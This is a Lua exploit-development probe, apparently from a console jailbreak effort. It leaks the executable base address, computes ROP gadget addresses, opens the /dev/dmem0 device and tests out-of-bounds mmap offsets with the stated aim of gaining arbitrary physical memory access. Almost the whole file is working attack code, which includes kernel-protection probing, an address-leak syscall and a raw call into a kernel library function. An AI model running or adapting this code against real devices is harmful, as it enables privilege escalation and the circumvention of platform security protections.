-- CRASH_CLASS: MODERATE
-- PROBE 532d: Attempt dmem0 mmap OUTSIDE the pool range
--
-- 532c confirmed: child thread mmap(477) on dmem0 works within pool.
-- Pool: physical 0x100000000-0x150000000, size 0x50000000.
-- Pool-relative offset range: 0 to 0x4FFFFFFF.
--
-- Question: does dmem0 enforce the pool boundary?
-- Test offsets OUTSIDE the pool to see if we can map arbitrary phys.
--
-- Test targets:
--   1. offset = 0x50000000 (one page past pool end)
--   2. offset = 0 (pool start — should work, as control)
--   3. offset = 0x60000000 (well past pool)
--   4. offset = 0xFFF00000000 (kernel range candidate)
--   5. Raw phys 0 (physical page 0)
--
-- If any OOB offset succeeds → we have arbitrary physical memory access.

print("=== PROBE 532d: DMEM OOB MAP ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end

local sc_mmap = make_syscall(477)
local sc_430 = make_syscall(430)
local sc_nanosleep = make_syscall(240)
local syscall_ret = syscall.pipe.fn_addr

local ok_p, pid_v = pcall(function() return make_syscall(20)() end)
print("pid=" .. q(pid_v))

local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eb_lo = rd(info + 0x108) or 0
local eb_hi = rd(info + 0x10C) or 0
local eboot = uint64(string.format("0x%X%08X", eb_hi or 0, eb_lo or 0))
print("eb=" .. q(eboot))

local pop_rax_ret = eboot + uint64(0x992)
local pop_rdi_ret = eboot + uint64(0xC9DFE)
local pop_rsi_ret = eboot + uint64(0xD77D)
local pop_rdx_ret = eboot + uint64(0x3B02D7)
local mov_rdi_rax_ret = eboot + uint64(0x92C67)
local jmp_self = eboot + uint64(0x15481)

-- Open dmem0
local devpath = memory.alloc(32)
zero(devpath, 32)
wd(devpath + 0, 0x7665642F)
wd(devpath + 4, 0x656D642F)
wd(devpath + 8, 0x0000306D)
local sc_open = make_syscall(5)
local ok_o, dmem_fd = pcall(function()
    return sc_open(uint64(devpath), uint64(0x10002), uint64(0))
end)
print("dmem_fd=" .. q(dmem_fd))

-- Setup shared + stack + TCB
local ok_s, shared = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
zero(shared, 0x4000)

local ok_st, stack_base = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)

local ok_t, tcb_page = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
for off = 0, 0x100, 8 do wq(tcb_page + off, tcb_page) end
local tcb_ptr = memory.alloc(8)
wq(tcb_ptr, tcb_page)

-- First: test from MAIN THREAD (simpler, no child needed)
-- mmap(477) with various offsets on dmem0 fd
print("")
print("[MAIN THREAD TESTS]")

local test_offsets = {
    { name = "in-pool-start",   off = uint64(0) },
    { name = "in-pool-alloc",   off = uint64(0x10010000) },
    { name = "pool-end",        off = uint64(0x4FFFC000) },
    { name = "oob-1page",       off = uint64(0x50000000) },
    { name = "oob-far",         off = uint64(0x60000000) },
    { name = "phys-0",          off = uint64("0xFFFFFFFF00000000") },
    { name = "neg-offset",      off = uint64("0xFFFFFFFFF0000000") },
}

for _, t in ipairs(test_offsets) do
    local ok_m, va = pcall(function()
        return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
            uint64(1), dmem_fd, t.off)
    end)
    local va_n = to_num(va)
    if va_n < 0 then va_n = va_n + 0x100000000 end

    local status
    if not ok_m then
        status = "PCALL_FAIL"
    elseif va_n == 0 then
        status = "NULL"
    elseif va_n > 0x200000000 then
        -- Looks like a valid VA
        status = "MAPPED " .. q(va)
        -- Try to read
        local rv = rd(va_n)
        if rv then
            status = status .. string.format(" rd=0x%X", rv < 0 and rv + 0x100000000 or rv)
        else
            status = status .. " rd=FAULT"
        end
    else
        -- Negative/error return
        status = "ERR " .. q(va)
    end
    print(string.format("  %-16s off=%s → %s", t.name, q(t.off), status))
end

-- Also try: what if we don't AllocateDirectMemory first?
-- Just mmap a page at offset 0 of the pool
print("")
print("[ALLOC TEST]")
-- AllocateDirectMemory to get a known-good phys
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0x2001), info) end)
local lk_lo = rd(info + 0x108) or 0
local lk_hi = rd(info + 0x10C) or 0
local lk = uint64(string.format("0x%X%08X", lk_hi or 0, lk_lo or 0))
local alloc_fn = lk + uint64(0x17EF0)

local phys_out = memory.alloc(8); wq(phys_out, uint64(0))
pcall(function()
    native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(phys_out))
end)
local phys = rq(phys_out)
print("  phys=" .. q(phys))
local pool_off = phys - uint64("0x100000000")
print("  pool_off=" .. q(pool_off))

-- mmap the allocated page
local ok_am, alloc_va = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(1), dmem_fd, pool_off)
end)
print("  alloc_mmap=" .. q(alloc_va))

-- mmap an unallocated page (offset 0 — may or may not be allocated)
local ok_um, unalloc_va = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(1), dmem_fd, uint64(0))
end)
print("  unalloc_mmap(off=0)=" .. q(unalloc_va))

print("")
print("=== 532d DONE ===")
